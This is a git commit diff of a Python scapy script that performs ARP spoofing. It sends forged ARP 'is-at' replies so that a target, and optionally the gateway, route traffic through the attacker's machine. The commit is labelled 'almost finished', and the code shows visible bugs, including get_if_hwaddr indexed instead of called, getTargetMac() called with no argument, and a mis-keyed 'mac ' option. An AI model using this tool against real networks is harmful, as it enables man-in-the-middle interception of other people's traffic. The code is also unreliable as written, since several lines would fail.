76b434c8eb32e3f22219f4e62c94630fe5b3b08b
Idan Maman <90776557+idanmaman2@users.noreply.github.com>
2022-11-22 21:45:11 +0200

    almost finished

--- arpspoofer.py
+++
@@ -1,4 +0,0 @@
-
-
-def spoof():
-    print("hello")
--- main.py
+++ main.py
@@ -1,16 +1,19 @@
 #!/usr/bin/python
 
 import sys, getopt
-from scapy.all import Ether , ARP,conf, get_if_addr,srp1,sendp
+from scapy.all import Ether , ARP,conf, get_if_addr , get_if_hwaddr,srp1,sendp
 from time import sleep
 from dhcpclient import DHCPClient
 BROADCASTMAC = "ff:ff:ff:ff:ff:ff"
+rep = False 
 options = {
         "interface" :conf.iface,
         "delay" : 3 , 
         "attackGW" : None , 
         "target" : "127.0.0.1",
-        "src": None
+        "src": None , 
+        "router" : None , 
+        "mac ":None 
     } 
 def getTargetMac(target : str)->str : 
     etherAttack = Ether(dst =BROADCASTMAC)
@@ -18,22 +21,11 @@ def getTargetMac(target : str)->str :
     reply = srp1(etherAttack/arpAttack , iface = options["interface"],verbose=False)
     return reply[Ether].src
 
-
-def getGetWayIp(): 
-    suc = None
-    while not suc : 
-        client = DHCPClient(iface = options["interface"])
-        client.discover().join()
-        suc = client.ackOptions
-    return suc
-
-def changeArpTable( target : str , src :str )->None:
-    etherAttack = Ether(dst =getTargetMac(target))
+def changeArpTable( target : str , src :str , srcMac : str )->None:
+    etherAttack = Ether(dst =getTargetMac(target) , src = srcMac)
     arpAttack = ARP(pdst = target , psrc = src, op = "is-at" )
     sendp(etherAttack/arpAttack , iface=options["interface"],verbose=False)
-    sleep(options["delay"])
-    changeArpTable(target,src)
-
+ 
 
 def main(argv :list )->None:
     '''
@@ -53,8 +45,8 @@ def main(argv :list )->None:
     '''
 
     try:
-        opts, args = getopt.getopt(argv, "s:t:d:gw:h", [
-                                    "src=","delay=","target=","getway","help"])
+        opts, args = getopt.getopt(argv, "s:t:d:i:gw:h", [
+                                    "src=","delay=","target=","iface=","getway","help"])
     except getopt.GetoptError as e:
         print(e)
         sys.exit(-1)
@@ -77,12 +69,15 @@ def main(argv :list )->None:
 
     if not options["src"]:
         options["src"]=  get_if_addr(options["interface"])
-    print(options.items())
-
-    print(getTargetMac("10.100.102.1"))
-    print("cool")
-    print(getGetWayIp())
-
+    options["router"] = next(filter(lambda x : x[3] == options["interface"] , dict(conf.route.__dict__)["routes"]))[2]
+    options["mac"]=get_if_hwaddr[options["interface"]]
+    targetMac= getTargetMac() 
+    #the attack 
+    changeArpTable(options["target"], options["router"] ,options["mac"] )
+    if(options["attackGW"]):
+        changeArpTable(options["router"] ,options["target"] , options["mac"] )
+    #repiar to the attack 
+ 
 if __name__ == "__main__":
     main(sys.argv[1:])
 
